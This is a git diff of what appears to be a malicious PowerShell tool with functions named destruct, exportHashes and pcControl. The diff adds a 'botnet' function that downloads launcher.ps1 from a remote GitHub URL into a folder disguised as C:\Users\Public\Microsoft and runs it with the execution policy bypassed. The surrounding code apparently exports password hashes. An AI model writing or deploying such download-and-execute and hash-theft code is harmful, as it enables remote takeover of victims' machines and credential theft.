@@ -50,7 +50,7 @@ function choose() # Switch function
     {
         0 {destruct;}
         1 {exportHashes;}
-        2 {destruct;}
+        2 {botnet;}
         3 {destruct;}
         4 {pcControl;}
     }
@@ -109,6 +109,12 @@ function exportHashes() # 1 - Export hashes
     $webclient.Dispose();
 
     choose;
+}
+
+function botnet()
+{
+    wget https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/launcher.ps1 -outfile "C:\Users\Public\Microsoft\launcher.ps1";
+    powershell -ExecutionPolicy Bypass -File "C:\Users\Public\Microsoft\launcher.ps1";
 }
 
 function pcControl() # 4 - PC(not in)Control
